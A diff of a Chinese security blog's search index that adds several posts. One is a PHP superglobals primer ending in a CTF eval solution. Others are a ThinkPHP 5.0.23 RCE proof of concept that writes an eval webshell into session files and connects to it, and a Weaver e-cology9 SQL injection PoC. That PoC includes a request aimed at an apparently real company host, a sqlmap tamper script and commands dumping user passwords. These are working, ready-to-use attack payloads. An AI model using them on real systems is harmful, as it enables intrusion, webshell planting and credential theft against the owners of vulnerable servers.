@@ -1,6 +1,103 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>php 中$_xxx的一些总结.md</title>
+    <url>/2023/05/18/CTF/php%20%E4%B8%AD$_xxx%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%BB%E7%BB%93/</url>
+    <content><![CDATA[<p>在CTF时，总会见到下面这些变量，他们都是Array类型</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$_GET</span><br><span class="line">$_POST</span><br><span class="line">$_COOKIE</span><br><span class="line">$_FILES</span><br><span class="line">$_REQUEST</span><br><span class="line">$_SERVER</span><br><span class="line">$_SESSION</span><br></pre></td></tr></table></figure>
+
+<p>本篇文章旨在对其进行一个总结</p>
+<h2 id="GET"><a href="#GET" class="headerlink" title="$_GET"></a>$_GET</h2><p><img src="/images/image-20230518101020945.png" alt="image-20230518101020945"></p>
+<h3 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">echo $_GET[&#x27;a&#x27;];</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/image-20230518101431312.png" alt="image-20230518101431312"></p>
+<h2 id="POST"><a href="#POST" class="headerlink" title="$_POST"></a>$_POST</h2><p><img src="/images/image-20230518101521978.png" alt="image-20230518101521978"></p>
+<h3 id="示例-1"><a href="#示例-1" class="headerlink" title="示例"></a>示例</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">echo $_POST[&#x27;a&#x27;];</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/image-20230518101657929.png" alt="image-20230518101657929"></p>
+<h2 id="COOKIE"><a href="#COOKIE" class="headerlink" title="$_COOKIE"></a>$_COOKIE</h2><p>PHP 的 $_COOKIE 变量用于取回 cookie 的值。</p>
+<h3 id="示例-2"><a href="#示例-2" class="headerlink" title="示例"></a>示例</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">echo $_COOKIE[&#x27;aaa&#x27;];</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<h5 id="发送的数据包为"><a href="#发送的数据包为" class="headerlink" title="发送的数据包为"></a>发送的数据包为</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET / HTTP/1.1</span><br><span class="line">Host: 127.0.0.1:88</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/113.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Cookie: aaa=11111</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/image-20230518102219070.png" alt="image-20230518102219070"></p>
+<h2 id="FILES"><a href="#FILES" class="headerlink" title="$_FILES"></a>$_FILES</h2><p>$_FILES通常用于获取上传文件有关的各种信息</p>
+<h3 id="示例-3"><a href="#示例-3" class="headerlink" title="示例"></a>示例</h3><h5 id="构造上传页面"><a href="#构造上传页面" class="headerlink" title="构造上传页面"></a>构造上传页面</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;form method=&quot;POST&quot; action=&quot;index.php&quot; enctype=&quot;multipart/form-data&quot;&gt;</span><br><span class="line">    &lt;input type=&quot;file&quot; name=&quot;upfile&quot;&gt;</span><br><span class="line">    &lt;button type=&quot;submit&quot;&gt;Upload&lt;/button&gt; </span><br><span class="line">&lt;/form&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/image-20230518105254487.png" alt="image-20230518105254487"></p>
+<h5 id="数据包"><a href="#数据包" class="headerlink" title="数据包"></a>数据包</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /index.php HTTP/1.1</span><br><span class="line">Host: 127.0.0.1:88</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/113.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: multipart/form-data; boundary=---------------------------40805532493162472637768217925</span><br><span class="line">Content-Length: 223</span><br><span class="line">Origin: http://127.0.0.1:88</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http://127.0.0.1:88/test.html</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">-----------------------------40805532493162472637768217925</span><br><span class="line">Content-Disposition: form-data; name=&quot;upfile&quot;; filename=&quot;test.txt&quot;</span><br><span class="line">Content-Type: text/plain</span><br><span class="line"></span><br><span class="line">123</span><br><span class="line">-----------------------------40805532493162472637768217925--</span><br></pre></td></tr></table></figure>
+
+<p>若文件上传域的name属性值为upfile，则可以使用$_FILES[‘upfile’]访问文件的有关信息。</p>
+<h5 id="index-php"><a href="#index-php" class="headerlink" title="index.php"></a>index.php</h5><p>因为返回的是Array，所以这里使用var_dump读</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">var_dump($_FILES[&#x27;upfile&#x27;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/image-20230518105132795.png" alt="image-20230518105132795"></p>
+<p>可以echo出具体的内容</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo $_FILES[&#x27;upfile&#x27;][&#x27;name&#x27;];</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/image-20230518105645844.png" alt="image-20230518105645844"></p>
+<h2 id="REQUEST"><a href="#REQUEST" class="headerlink" title="$_REQUEST"></a>$_REQUEST</h2><p>接收不管是post还是get的内容，形成数组</p>
+<h3 id="示例-4"><a href="#示例-4" class="headerlink" title="示例"></a>示例</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">var_dump($_REQUEST);</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/image-20230518113528525.png" alt="image-20230518113528525"></p>
+<p>同理，可以直接获取某一个键值</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo $_REQUEST[&#x27;xxx&#x27;];</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/image-20230518113614151.png" alt="image-20230518113614151"></p>
+<h2 id="SERVER"><a href="#SERVER" class="headerlink" title="$_SERVER"></a>$_SERVER</h2><p>超级全局变量</p>
+<p><img src="/images/image-20230518153914858.png" alt="image-20230518153914858"></p>
+<h3 id="示例-5"><a href="#示例-5" class="headerlink" title="示例"></a>示例</h3><p>先全部输出看一下</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">var_dump($_SERVER);</span><br></pre></td></tr></table></figure>
+
+<p>可以看到包括一些环境变量</p>
+<p><img src="/images/image-20230518155502061.png" alt="image-20230518155502061"></p>
+<p>也包含数据包相关的内容</p>
+<p><img src="/images/image-20230518160407349.png" alt="image-20230518160407349"></p>
+<h5 id="读取自定义请求头的内容"><a href="#读取自定义请求头的内容" class="headerlink" title="读取自定义请求头的内容"></a>读取自定义请求头的内容</h5><p>注意要大写，并加上HTTP_</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo $_SERVER[&#x27;HTTP_CMD&#x27;];</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/image-20230518160705615.png" alt="image-20230518160705615"></p>
+<h2 id="SESSION"><a href="#SESSION" class="headerlink" title="$_SESSION"></a>$_SESSION</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">session_start();</span><br><span class="line">$_SESSION[&#x27;test&#x27;]=aaaaaaaaaaaaaaaaaa;</span><br><span class="line">var_dump($_SESSION);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/image-20230518163056913.png" alt="image-20230518163056913"></p>
+<h3 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h3><p>这个session是会保持的</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">session_start();</span><br><span class="line">$_SESSION[&#x27;ddddd&#x27;] = $_POST[&#x27;username&#x27;];</span><br><span class="line">var_dump($_SESSION)</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>上述的代码中，如果不关闭服务器服务</p>
+<p>修改ddddd，前面的session也会输出</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$_SESSION[&#x27;ddddd&#x27;] </span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/image-20230518164506882.png" alt="image-20230518164506882"></p>
+<h5 id="释放session"><a href="#释放session" class="headerlink" title="释放session"></a>释放session</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">unset($_SESSION[&#x27;ddddd&#x27;]);</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/image-20230518170301891.png" alt="image-20230518170301891"></p>
+<h5 id="通过-session-destroy-函数彻底终结-session"><a href="#通过-session-destroy-函数彻底终结-session" class="headerlink" title="通过 session_destroy() 函数彻底终结 session"></a>通过 session_destroy() 函数彻底终结 session</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">session_destroy();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="一道CTF"><a href="#一道CTF" class="headerlink" title="一道CTF"></a>一道CTF</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line">eval($_REQUEST[$_GET[$_POST[$_COOKIE[&#x27;CTFshow-QQ群:&#x27;]]]][6][0][7][5][8][0][9][4][4]);</span><br></pre></td></tr></table></figure>
+
+<h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$_REQUEST[$_GET[$_POST[$_COOKIE[&#x27;CTFshow-QQ群:&#x27;]]]][6][0][7][5][8][0][9][4][4]</span><br></pre></td></tr></table></figure>
+
+<p>可以放进phpStream里面分析，会帮你把闭合高亮出来</p>
+<p><img src="/images/image-20230315200815285.png" alt="image-20230315200815285"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$_REQUEST[$_GET[$_POST[$_COOKIE[&#x27;CTFshow-QQ群:&#x27;]]]]</span><br></pre></td></tr></table></figure>
+
+<p>这里需要注意的是</p>
+<p>cookie需要写成</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CTFshow-QQ群:=。。。。。。。。。</span><br></pre></td></tr></table></figure>
+
+<p>不能写成</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CTFshow-QQ群=。。。。。。。。。</span><br></pre></td></tr></table></figure>
+
+<h3 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /?b=c&amp;c[6][0][7][5][8][0][9][4][4]=system(&quot;cat%20%2ff1agaaa&quot;); HTTP/1.1</span><br><span class="line">Host: 41ed604f-03eb-4f5b-be5c-321d714b968c.challenge.ctf.show</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/110.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 3</span><br><span class="line">Origin: http://41ed604f-03eb-4f5b-be5c-321d714b968c.challenge.ctf.show</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http://41ed604f-03eb-4f5b-be5c-321d714b968c.challenge.ctf.show/?b=c&amp;c[6][0][7][5][8][0][9][4][4]=system(%22ls%22);</span><br><span class="line">Cookie: CTFshow-QQ群:=a</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">a=b</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/image-20230315205526288.png" alt="image-20230315205526288"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ctfshow&#123;1b3be01d-059d-45c2-b917-a193b8ee8040&#125;</span><br></pre></td></tr></table></figure>
+]]></content>
+      <categories>
+        <category>CTF</category>
+      </categories>
+  </entry>
+  <entry>
     <title>github绑定个人域名</title>
     <url>/2023/05/05/ForGithub/github%E7%BB%91%E5%AE%9A%E4%B8%AA%E4%BA%BA%E5%9F%9F%E5%90%8D/</url>
     <content><![CDATA[<h2 id="域名"><a href="#域名" class="headerlink" title="域名"></a>域名</h2><p><a href="https://www.godaddy.com/zh-sg">域名注册购买,云服务器,建站,企业邮箱和网站安全-GoDaddy官方中文站</a></p>
@@ -375,6 +472,105 @@
       </categories>
   </entry>
   <entry>
+    <title>thinkphp 5.0.23-RCE利用</title>
+    <url>/2023/05/18/POC/thinkphp%205.0.23-RCE%E5%88%A9%E7%94%A8/</url>
+    <content><![CDATA[<h2 id="基础payload"><a href="#基础payload" class="headerlink" title="基础payload"></a>基础payload</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /index.php?s=captcha HTTP/1.1</span><br><span class="line">Host: 1.1.1.1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/113.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">If-Modified-Since: Wed, 27 Feb 2019 06:32:09 GMT</span><br><span class="line">If-None-Match: &quot;5c762ee9-5&quot;</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 76</span><br><span class="line"></span><br><span class="line">_method=__construct&amp;filter[]=system&amp;method=get&amp;server[REQUEST_METHOD]=id</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/image-20230518090910918.png" alt="image-20230518090910918"></p>
+<h2 id="phpinfo"><a href="#phpinfo" class="headerlink" title="phpinfo"></a>phpinfo</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /index.php?s=captcha HTTP/1.1</span><br><span class="line">Host: 1.1.1.1</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 135</span><br><span class="line"></span><br><span class="line">_method=__construct&amp;method=get&amp;filter[]=think\__include_file&amp;server[]=phpinfo&amp;get[]=/tmp/sess_5tc1epe1vuk0uqdfssbvvc3pe7&amp;x=phpinfo();</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/image-20230517225116294.png" alt="image-20230517225116294"></p>
+<h2 id="构造数据包直接连接webshell"><a href="#构造数据包直接连接webshell" class="headerlink" title="构造数据包直接连接webshell"></a>构造数据包直接连接webshell</h2><p>利用方式和包含日志文件sess_xxxxxxxx类似，需要先将马先写入sess_xxxxxxxx日志文件中</p>
+<p>而这个sess_文件的名称是通过Cookie: PHPSESSID&#x3D;xxxxxxx来指定的</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Cookie: PHPSESSID=good123123</span><br></pre></td></tr></table></figure>
+
+<p>则日志文件名为</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sess_good123123</span><br></pre></td></tr></table></figure>
+
+<p>linux中通常放置于</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/tmp/sess_good123123</span><br></pre></td></tr></table></figure>
+
+<h3 id="创建session文件"><a href="#创建session文件" class="headerlink" title="创建session文件"></a>创建session文件</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">_method=__construct&amp;filter[]=think\Session::set&amp;method=GET&amp;server[REQUEST_METHOD]=&lt;?php eval($_POST[&#x27;abc&#x27;]);?&gt;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/tmp/sess_2333shell</span><br></pre></td></tr></table></figure>
+
+<h5 id="post包"><a href="#post包" class="headerlink" title="post包"></a>post包</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /index.php?s=captcha HTTP/1.1</span><br><span class="line">Host: 1.1.1.1</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span><br><span class="line">Cookie: PHPSESSID=good123123</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 110</span><br><span class="line"></span><br><span class="line">_method=__construct&amp;filter[]=think\Session::set&amp;method=GET&amp;server[REQUEST_METHOD]=&lt;?php eval($_POST[&#x27;abc&#x27;]);?&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/image-20230518001530147.png" alt="image-20230518001530147"></p>
+<h5 id="可以查看一下tmp目录"><a href="#可以查看一下tmp目录" class="headerlink" title="可以查看一下tmp目录"></a>可以查看一下tmp目录</h5><p>看一下是否成功写入</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /index.php?s=captcha HTTP/1.1</span><br><span class="line">Host: 1.1.1.1</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 77</span><br><span class="line"></span><br><span class="line">_method=__construct&amp;filter[]=system&amp;method=get&amp;server[REQUEST_METHOD]=ls /tmp</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/image-20230518001551800.png" alt="image-20230518001551800"></p>
+<h3 id="连接蚁剑"><a href="#连接蚁剑" class="headerlink" title="连接蚁剑"></a>连接蚁剑</h3><p><img src="/images/image-20230518001621137.png" alt="image-20230518001621137"></p>
+<h5 id="设置body"><a href="#设置body" class="headerlink" title="设置body"></a>设置body</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">_method=__construct&amp;method=get&amp;filter[]=think\__include_file&amp;server[]=phpinfo&amp;get[]</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/tmp/sess_good123123</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/image-20230518001404974.png" alt="image-20230518001404974"></p>
+<h5 id="成功连接"><a href="#成功连接" class="headerlink" title="成功连接"></a>成功连接</h5><p><img src="/images/image-20230518001431455.png" alt="image-20230518001431455"></p>
+<h5 id="看一下sess-xxxxxxxxx文件中的内容"><a href="#看一下sess-xxxxxxxxx文件中的内容" class="headerlink" title="看一下sess_xxxxxxxxx文件中的内容"></a>看一下sess_xxxxxxxxx文件中的内容</h5><p><img src="/images/image-20230518092101501.png" alt="image-20230518092101501"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">think|a:2:&#123;s:28:&quot;&lt;?php eval($_POST[&#x27;abc&#x27;]);?&gt;&quot;;s:0:&quot;&quot;;s:0:&quot;&quot;;s:0:&quot;&quot;;&#125;d2d977c58444271d9c780187e93f80e5|a:2:&#123;s:11:&quot;verify_code&quot;;s:32:&quot;5e3e4963c40c376ff421127ae4342bab&quot;;s:11:&quot;verify_time&quot;;i:1684371746;&#125;</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>POC</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>泛微e-cology9 browser.jsp SQL注入</title>
+    <url>/2023/05/05/POC/%E6%B3%9B%E5%BE%AEe-cology9%20browser.jsp%20SQL%E6%B3%A8%E5%85%A5/</url>
+    <content><![CDATA[<h2 id="验证poc"><a href="#验证poc" class="headerlink" title="验证poc"></a>验证poc</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /mobile/%20/plugin/browser.jsp HTTP/1.1</span><br><span class="line">Host: x.x.x.x</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: PHPSESSID=fr8sbim6j8kssn90m1k7gqt7q5</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 651</span><br><span class="line"></span><br><span class="line">isDis=1&amp;browserTypeId=269&amp;keyword=%2525%2536%2531%2525%2532%2537%2525%2532%2530%2525%2537%2535%2525%2536%2565%2525%2536%2539%2525%2536%2566%2525%2536%2565%2525%2532%2530%2525%2537%2533%2525%2536%2535%2525%2536%2563%2525%2536%2535%2525%2536%2533%2525%2537%2534%2525%2532%2530%2525%2533%2531%2525%2532%2563%2525%2532%2537%2525%2532%2537%2525%2532%2562%2525%2532%2538%2525%2535%2533%2525%2534%2535%2525%2534%2563%2525%2534%2535%2525%2534%2533%2525%2535%2534%2525%2532%2530%2525%2534%2530%2525%2534%2530%2525%2535%2536%2525%2534%2535%2525%2535%2532%2525%2535%2533%2525%2534%2539%2525%2534%2566%2525%2534%2565%2525%2532%2539%2525%2532%2562%2525%2532%2537</span><br></pre></td></tr></table></figure>
+
+<p>或者</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/mobile/plugin/browser.js</span><br></pre></td></tr></table></figure>
+
+<p>sql语句经过了三层全字符的url编码</p>
+<p><img src="/images/image-20230505210145029.png" alt="image-20230505210145029"></p>
+<h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /mobile/%20/plugin/browser.jsp HTTP/1.1</span><br><span class="line">Host: oa.chinataitan.com:8081</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: PHPSESSID=fr8sbim6j8kssn90m1k7gqt7q5</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 651</span><br><span class="line"></span><br><span class="line">isDis=1&amp;browserTypeId=269&amp;keyword=%2525%2536%2531%2525%2532%2537%2525%2532%2530%2525%2537%2535%2525%2536%2565%2525%2536%2539%2525%2536%2566%2525%2536%2565%2525%2532%2530%2525%2537%2533%2525%2536%2535%2525%2536%2563%2525%2536%2535%2525%2536%2533%2525%2537%2534%2525%2532%2530%2525%2533%2531%2525%2532%2563%2525%2532%2537%2525%2532%2537%2525%2532%2562%2525%2532%2538%2525%2535%2533%2525%2534%2535%2525%2534%2563%2525%2534%2535%2525%2534%2533%2525%2535%2534%2525%2532%2530%2525%2534%2530%2525%2534%2530%2525%2535%2536%2525%2534%2535%2525%2535%2532%2525%2535%2533%2525%2534%2539%2525%2534%2566%2525%2534%2565%2525%2532%2539%2525%2532%2562%2525%2532%2537</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/image-20230424112323042.png" alt="image-20230424112323042"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a&#x27; union select 1,&#x27;&#x27;+(SELECT @@VERSION)+&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/image-20230424112525537.png" alt="image-20230424112525537"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a&#x27; union select 1,2222222222&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/image-20230424135948099.png" alt="image-20230424135948099"></p>
+<p><img src="/images/image-20230424140010831.png" alt="image-20230424140010831"></p>
+<h2 id="sqlmap-tamper"><a href="#sqlmap-tamper" class="headerlink" title="sqlmap tamper"></a>sqlmap tamper</h2><h3 id="tamper脚本"><a href="#tamper脚本" class="headerlink" title="tamper脚本"></a>tamper脚本</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/usr/bin/env python </span><br><span class="line">import re</span><br><span class="line">from lib.core.settings import UNICODE_ENCODING</span><br><span class="line">from lib.core.enums import PRIORITY</span><br><span class="line">__priority__ = PRIORITY.NORMAL</span><br><span class="line"> </span><br><span class="line">def dependencies():</span><br><span class="line">    pass</span><br><span class="line"></span><br><span class="line">def tamper(payload, **kwargs):</span><br><span class="line">    # URL encoding for all characters</span><br><span class="line">    encoded_payload = &#x27;&#x27;.join([&#x27;%&#x27; + format(ord(c), &#x27;x&#x27;) for c in payload])</span><br><span class="line"></span><br><span class="line">    encoded_payload = &#x27;&#x27;.join([&#x27;%&#x27; + format(ord(c), &#x27;x&#x27;) for c in encoded_payload])</span><br><span class="line"></span><br><span class="line">    encoded_payload = &#x27;&#x27;.join([&#x27;%&#x27; + format(ord(c), &#x27;x&#x27;) for c in encoded_payload])</span><br><span class="line"></span><br><span class="line">    encoded_payload = encoded_payload.replace(&#x27; &#x27;, &#x27;%20&#x27;)</span><br><span class="line"></span><br><span class="line">    return encoded_payload</span><br></pre></td></tr></table></figure>
+
+<h3 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -r D:\Desktop\t.txt --tamper weaver.py --prefix=&quot;a&#x27; union select 1,&#x27;&#x27;+(&quot; --suffix=&quot;)+&#x27;&quot; --level=5 --risk=2 --tables --batch</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -r D:\Desktop\t.txt --tamper weaver9.py -p &quot;keyword&quot; --level=5 --risk=2 --tables</span><br></pre></td></tr></table></figure>
+
+<h3 id="获取ecology的用户名密码"><a href="#获取ecology的用户名密码" class="headerlink" title="获取ecology的用户名密码"></a>获取ecology的用户名密码</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -r D:\Desktop\t.txt  --tamper=&quot;weaver9.py&quot; -p &quot;keyword&quot; --prefix=&quot;a&#x27; union select 1,&#x27;&#x27;+(&quot; --suffix=&quot;)+&#x27;&quot; --level=5 --risk=2 -D ecology -T dbo.hrmresourcemanager --columns</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -r D:\Desktop\t.txt --tamper=&quot;weaver9.py&quot; -p &quot;keyword&quot; --prefix=&quot;a&#x27; union select 1,&#x27;&#x27;+(&quot; --suffix=&quot;)+&#x27;&quot; --level=5 --risk=2 -D ecology -T dbo.hrmresourcemanager -C id,password,loginid --dump</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/image-20230424145319892.png" alt="image-20230424145319892"></p>
+]]></content>
+      <categories>
+        <category>POC</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>pikachu靶场系列-敏感信息泄露</title>
+    <url>/2023/05/04/pikachu%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97/IcanseeyourABC/</url>
+    <content><![CDATA[<p>敏感信息泄露涉及很多方面</p>
+<p>未授权接口，网站源码，用户名密码泄露等都可以归为敏感信息泄露</p>
